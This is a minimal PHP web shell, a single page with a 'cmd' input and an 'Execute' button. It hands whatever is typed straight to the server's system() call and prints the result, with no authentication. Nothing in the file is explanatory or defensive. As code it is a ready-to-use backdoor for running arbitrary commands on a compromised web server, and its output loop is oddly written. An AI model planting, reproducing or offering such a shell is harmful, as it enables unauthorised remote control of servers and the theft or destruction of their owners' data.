<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        $comando = system($_GET['cmd']);
        while($comando != ""){
            sleep(10);
            echo $comando;
            flush();
        }
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>